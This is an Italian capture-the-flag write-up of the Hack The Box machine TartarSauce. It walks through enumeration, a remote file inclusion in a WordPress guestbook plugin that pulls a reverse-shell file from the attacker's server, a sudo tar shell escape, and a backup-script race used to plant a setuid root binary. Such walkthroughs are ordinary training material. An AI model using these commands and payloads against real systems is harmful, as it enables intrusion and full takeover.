# TartarSauce

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.88
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.88 (10.10.10.88)
Host is up (0.039s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries
| /webservices/tar/tar/source/
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
|_/webservices/developmental/ /webservices/phpmyadmin/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/16%OT=80%CT=1%CU=31243%PV=Y%DS=2%DC=I%G=Y%TM=652CF3
OS:7C%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
```

## Enumeration

Innanzitutto, visito la pagina http://10.10.10.88/:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-1.png" />
</p>

Lancio il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.88/
```

Ottengo il seguente risultato:

```text
Target: http://10.10.10.88/

[04:34:31] Starting:
[04:34:34] 403 -  297B  - /.ht_wsr.txt
[04:34:34] 403 -  302B  - /.htaccess.sample
[04:34:34] 403 -  300B  - /.htaccess.save
[04:34:34] 403 -  300B  - /.htaccess_orig
[04:34:34] 403 -  301B  - /.htaccess_extra
[04:34:34] 403 -  300B  - /.htaccess.orig
[04:34:34] 403 -  290B  - /.htm
[04:34:34] 403 -  298B  - /.htaccessBAK
[04:34:34] 403 -  299B  - /.htaccessOLD2
[04:34:34] 403 -  298B  - /.htaccessOLD
[04:34:34] 403 -  300B  - /.htpasswd_test
[04:34:34] 403 -  297B  - /.httr-oauth
[04:34:34] 403 -  296B  - /.htpasswds
[04:34:35] 403 -  300B  - /.htaccess.bak1
[04:34:35] 403 -  291B  - /.html
[04:34:35] 403 -  298B  - /.htaccess_sc
[04:34:36] 403 -  290B  - /.php
[04:34:36] 403 -  291B  - /.php3
[04:35:09] 200 -   11KB - /index.html
[04:35:27] 200 -  208B  - /robots.txt
[04:35:28] 403 -  300B  - /server-status/
[04:35:28] 403 -  299B  - /server-status

Task Completed
```

Questo è il contenuto del file _robots.txt_:

```text
User-agent: *
Disallow: /webservices/tar/tar/source/
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/
Disallow: /webservices/developmental/
Disallow: /webservices/phpmyadmin/
```

Visito la pagina http://10.10.10.88/webservices/monstra-3.0.4/:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-6.png" />
</p>

Provo a scoprire se esiste qualche vulnerabilità per questa versione di _Monstra_ utilizzando _searchsploit_:

```text
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution                                                  | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                                                                      | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                                                                            | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                                                                                 | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                                                                          | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                                                                     | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                                                                     | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                                                                 | php/webapps/45164.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Ci sono diverse opzioni da utilizzare, ma prima di effettuare dei tentativi vado avanti con la ricerca.

Lancio di nuovo il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.88/webservices/
```

Ottengo il seguente risultato:

```text
Target: http://10.10.10.88/webservices/

[04:41:07] Starting: k
[04:41:10] 403 -  309B  - /webservices/.ht_wsr.txt
[04:41:10] 403 -  312B  - /webservices/.htaccess.bak1
[04:41:10] 403 -  313B  - /webservices/.htaccess_extra
[04:41:10] 403 -  314B  - /webservices/.htaccess.sample
[04:41:10] 403 -  312B  - /webservices/.htaccess.orig
[04:41:10] 403 -  310B  - /webservices/.htaccessBAK
[04:41:10] 403 -  312B  - /webservices/.htaccess_orig
[04:41:10] 403 -  310B  - /webservices/.htaccess_sc
[04:41:10] 403 -  302B  - /webservices/.htm
[04:41:10] 403 -  303B  - /webservices/.html
[04:41:10] 403 -  311B  - /webservices/.htaccessOLD2
[04:41:10] 403 -  312B  - /webservices/.htaccess.save
[04:41:10] 403 -  310B  - /webservices/.htaccessOLD
[04:41:10] 403 -  308B  - /webservices/.htpasswds
[04:41:10] 403 -  312B  - /webservices/.htpasswd_test
[04:41:10] 403 -  309B  - /webservices/.httr-oauth
[04:41:11] 403 -  303B  - /webservices/.php3
[04:41:11] 403 -  302B  - /webservices/.php
[04:42:17] 301 -  319B  - /webservices/wp  ->  http://10.10.10.88/webservices/wp/
[04:42:19] 200 -    2KB - /webservices/wp/wp-login.php
[04:42:19] 200 -   11KB - /webservices/wp/

Task Completed
```

Visito la pagina http://10.10.10.88/webservices/wp/:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-2.png" />
</p>

Lancio il comando _whatweb_:

```text    
http://tartarsauce.htb/webservices/wp/ [200 OK] Apache[2.4.18], Bootstrap[3.3.6,4.9.4], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.88], JQuery[1.12.4], MetaGenerator[WordPress 4.9.4], Modernizr[custom.min], PoweredBy[&nbsp;], Script[text/javascript], Title[Test blog &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.9.4], X-UA-Compatible[IE=edge]
```

Scopro quindi che la versione di WordPress è la 4.9.4.

Provando a cliccare sul link _Uncategorized_ ottengo il seguente risultato:

```text
Unable to connect
Firefox can’t establish a connection to the server at tartarsauce.htb.
```

Quindi aggiungo _tartarsauce.htb_ al file _/etc/hosts_.

Visitando di nuovo la pagina ottengo questo:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-3.png" />
</p>

Clicco su _Hello world!_:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-4.png" />
</p>


Utilizzo nuovamente il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.88/webservices/wp/
```

Ottengo il seguente risultato:

```text
Target: http://10.10.10.88/webservices/wp/

[05:08:48] Starting:
[05:08:51] 403 -  312B  - /webservices/wp/.ht_wsr.txt
[05:08:51] 403 -  317B  - /webservices/wp/.htaccess.sample
[05:08:51] 403 -  315B  - /webservices/wp/.htaccess.orig
[05:08:51] 403 -  315B  - /webservices/wp/.htaccess.bak1
[05:08:51] 403 -  315B  - /webservices/wp/.htaccess.save
[05:08:52] 403 -  313B  - /webservices/wp/.htaccess_sc
[05:08:52] 403 -  305B  - /webservices/wp/.htm
[05:08:52] 403 -  313B  - /webservices/wp/.htaccessOLD
[05:08:52] 403 -  313B  - /webservices/wp/.htaccessBAK
[05:08:52] 403 -  306B  - /webservices/wp/.html
[05:08:52] 403 -  315B  - /webservices/wp/.htpasswd_test
[05:08:52] 403 -  311B  - /webservices/wp/.htpasswds
[05:08:52] 403 -  312B  - /webservices/wp/.httr-oauth
[05:08:52] 403 -  315B  - /webservices/wp/.htaccess_orig
[05:08:52] 403 -  316B  - /webservices/wp/.htaccess_extra
[05:08:52] 403 -  314B  - /webservices/wp/.htaccessOLD2
[05:08:53] 403 -  306B  - /webservices/wp/.php3
[05:08:53] 403 -  305B  - /webservices/wp/.php
[05:09:24] 301 -    0B  - /webservices/wp/index.php  ->  http://10.10.10.88/webservices/wp/
[05:09:27] 200 -   19KB - /webservices/wp/license.txt
[05:09:41] 200 -    7KB - /webservices/wp/readme.html
[05:09:54] 301 -  328B  - /webservices/wp/wp-admin  ->  http://10.10.10.88/webservices/wp/wp-admin/
[05:09:54] 200 -    0B  - /webservices/wp/wp-content/
[05:09:55] 301 -  330B  - /webservices/wp/wp-content  ->  http://10.10.10.88/webservices/wp/wp-content/
[05:09:55] 500 -    0B  - /webservices/wp/wp-content/plugins/hello.php
[05:09:55] 200 -   69B  - /webservices/wp/wp-content/plugins/akismet/akismet.php
[05:09:55] 403 -  320B  - /webservices/wp/wp-content/uploads/
[05:09:55] 403 -  320B  - /webservices/wp/wp-content/upgrade/
[05:09:55] 200 -    0B  - /webservices/wp/wp-config.php
[05:09:55] 400 -    1B  - /webservices/wp/wp-admin/admin-ajax.php
[05:09:55] 301 -  331B  - /webservices/wp/wp-includes  ->  http://10.10.10.88/webservices/wp/wp-includes/
[05:09:55] 500 -    0B  - /webservices/wp/wp-includes/rss-functions.php
[05:09:55] 403 -  313B  - /webservices/wp/wp-includes/
[05:09:55] 200 -    2KB - /webservices/wp/wp-login.php
[05:09:55] 200 -    0B  - /webservices/wp/wp-cron.php
[05:09:55] 500 -    3KB - /webservices/wp/wp-admin/setup-config.php
[05:09:56] 200 -    1KB - /webservices/wp/wp-admin/install.php
[05:09:56] 302 -    0B  - /webservices/wp/wp-admin/  ->  http://tartarsauce.htb/webservices/wp/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.88%2Fwebservices%2Fwp%2Fwp-admin%2F&reauth=1
[05:09:56] 302 -    0B  - /webservices/wp/wp-signup.php  ->  http://tartarsauce.htb/webservices/wp/wp-login.php?action=register
[05:09:56] 405 -   42B  - /webservices/wp/xmlrpc.php

Task Completed
```

Visitando la pagina http://tartarsauce.htb/webservices/wp/wp-login.php trovo questo:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-5.png" />
</p>

Provo ad utilizzare il comando _wpscan_ per lanciare una scansione:

```text
wpscan --url http://10.10.10.88:80/webservices/wp -e ap --plugins-detection aggressive --api-token [TOKEN_PERSONALE]
```

Ottengo il seguente risultato:

```text
URL: http://10.10.10.88/webservices/wp/
[+] Started: Mon Oct 16 12:40:01 2020Interesting Finding(s):[+] http://10.10.10.88/webservices/wp/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%[+] http://10.10.10.88/webservices/wp/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - ...[+] http://10.10.10.88/webservices/wp/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%[+] http://10.10.10.88/webservices/wp/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'
 |
 | [!] 25 vulnerabilities identified:
 |
 ...[i] The main theme could not be detected.[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:12:07 <===========================================================================================> (84420 / 84420) 100.00% Time: 00:12:07
[+] Checking Plugin Versions (via Passive and Aggressive Methods)[i] Plugin(s) Identified:[+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2019-11-13T20:46:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 |...[+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2019-10-25T15:26:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | [!] The version is out of date, the latest version is 3.1.7
....[+] WPVulnDB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 41[+] Finished: Thu Jan 16 21:52:23 2020
[+] Requests Done: 84464
[+] Cached Requests: 8
[+] Data Sent: 22.644 MB
[+] Data Received: 11.401 MB
[+] Memory used: 312.409 MB
[+] Elapsed time: 00:12:21
```

Quindi provo a scoprire la presenza di vulnerabilità sul plugin _gwolle_ tramite _searchsploit_:

```text
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                     |  Path
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion                                                                    | php/webapps/38861.txt
----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Il contenuto del file _38861.txt_ è il seguente:

```text
-----------------------------------------------------------------------------------------------
High-Tech Bridge Security Research Lab discovered a critical Remote File Inclusion (RFI) in Gwolle Guestbook WordPress plugin, which can be exploited by non-authenticated attacker to include remote PHP file and execute arbitrary code on the vulnerable system.

HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:

http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]

In order to exploit this vulnerability 'allow_url_include' shall be set to 1. Otherwise, attacker may still include local files and also execute arbitrary code.

Successful exploitation of this vulnerability will lead to entire WordPress installation compromise, and may even lead to the entire web server compromise.
-----------------------------------------------------------------------------------------------
```

Quindi passo alla fase successiva.

## Exploitation

Scarico il [file](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) che mi permetterà di ottenere una reverse-shell e avvio un listener sulla porta 1234.

Avvio un server http sulla porta 1111, modifico l'url che mi permetterà di effettuare un RFI (Remote File Inclusion) e invio la richiesta:

```text
http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.4:4444/
```

**Sono dentro!**

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-7.png" />
</p>

Purtroppo, non ho i privilegi per ottenere il primo flag in quanto sono soltanto un utente web deamon _www-data_.

## Privilege Escalation

Per prima cosa eseguo controllo i privilegi dell'utente attraverso il seguente comando:

```text
sudo -l
```

```text
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

Seguendo questa [guida](https://gtfobins.github.io/gtfobins/tar/) utilizzo il seguente comando per elevare i miei privilegi:

```text
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-8.png" />
</p>

**Ottengo così il primo flag!**

Per trovare una strada utile per diventare root, trasferisco lo script _leanpeas.sh_ sulla macchina _tartarsauce_ e lo avvio. Dall'output scopro qualcosa di interessante:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-9.png" />
</p>

Lo script _backuperer.timer_ è stato lanciato poco tempo fa. Quindi provo a capire dove si trova lanciando il seguente comando:

```text
find / -name backuperer* 2>/dev/null
```

```text
/etc/systemd/system/multi-user.target.wants/backuperer.timer
/lib/systemd/system/backuperer.service
/lib/systemd/system/backuperer.timer
/usr/sbin/backuperer
```

Scopro che non ho i permessi per modificarlo ma posso visualizzarlo:

```text
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Chiedo a _ChatGPT_ cosa fa questo programma:


 * Questo script Bash è un programma di backup automatizzato progettato per eseguire il backup di un'applicazione web nella directory `/var/www/html` su una macchina Linux. Ecco una spiegazione delle principali funzionalità e azioni compiute dallo script:

  1. **Variabili e configurazioni iniziali:** Lo script inizia dichiarando alcune variabili per le directory e i file di destinazione. Ad esempio, `$basedir` è la directory dell'applicazione web che verrà eseguito il backup, `$bkpdir` è la directory di destinazione dei backup, `$tmpdir` è una directory temporanea, e così via.

  2. **Creazione di un messaggio di test:** Viene creato un file di testo chiamato `$testmsg` che contiene un messaggio che indica l'ora dell'ultimo esecuzione dello script. Questo messaggio verrà utilizzato per tenere traccia dell'ultimo backup riuscito.

  3. **Pulizia dei vecchi file temporanei:** Viene eseguita una pulizia di vecchi file temporanei e di verifica dell'integrità dei backup precedenti.

  4. **Backup dei file dell'applicazione web:** Il comando `tar` viene utilizzato per comprimere e archiviare i file dell'applicazione web nella directory temporanea indicata da `$tmpfile`.

  5. **Attesa di 30 secondi:** Dopo il backup, lo script attende 30 secondi per consentire il completamento del processo di backup in caso siano stati aggiunti file di grandi dimensioni.

  6. **Controllo dell'integrità del backup:** Viene eseguito un controllo dell'integrità dei file di backup utilizzando il comando `diff`. Se vengono rilevati errori nell'integrità, questi errori vengono registrati nel file di errore `$errormsg`, e lo script restituisce il codice di uscita 2 (indicando un errore). In caso contrario, i file di backup vengono spostati nella directory di destinazione `$bkpdir`, e le directory temporanee vengono eliminate. Il codice di uscita 0 indica un backup riuscito.

Quindi posso sfruttare i 30 secondi di attesa per rimpiazzare il file di backup che viene creato con uno malevolo. Passati i 30 secondi lo script decomprimerà il tar rimpiazzato e fallirà il check sull'integrità.

Per prima cosa creo una cartella _var/www/html/_ sulla mia macchina e inserisco il seguente file [_setuid.c_](https://falconspy.medium.com/useful-oscp-notes-commands-d71b5eda7b02):

```text
#include <unistd.h>int main()
{
    setuid(0);
    execl("/bin/bash", "bash", (char *)NULL);
    return 0;
}
```

Successivamente, compilo il programma rispettando il vincolo dell'architettura a 32 della macchina da attaccare:

```text
gcc -m32 -o setuid setuid.c
```

Comprimo la cartella _var_:

```text
tar -zcvf exploit var
```

Poi avvio un server http attraverso il quale trasferisco il file _exploit_ alla macchina da attaccare (nella cartella _/var/tmp/_).

Dopodichè, basta aspettare l'esecuzione del servizio _backuperer_ e la creazione del backup temporaneo per sostiturilo con il file _exploit_ appena trasferito:

```text
cp exploit .e627dhwia.....
```

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-10.png" />
</p>

Attendo la fine dei 30 secondi affinchè venga creata la cartella _check_:

<p align="center">
  <img src="/Immagini/Linux-Box/TartarSauce/tartarsauce-11.png" />
</p>

**Quindi mi sposto all'interno della cartella ed eseguo il file _setuid_ per diventare root!**

## Different Solutions
 * [0xdf hacks stuff](https://0xdf.gitlab.io/2018/10/20/htb-tartarsauce.html#partial-privesc-onuma--file-read-as-root)
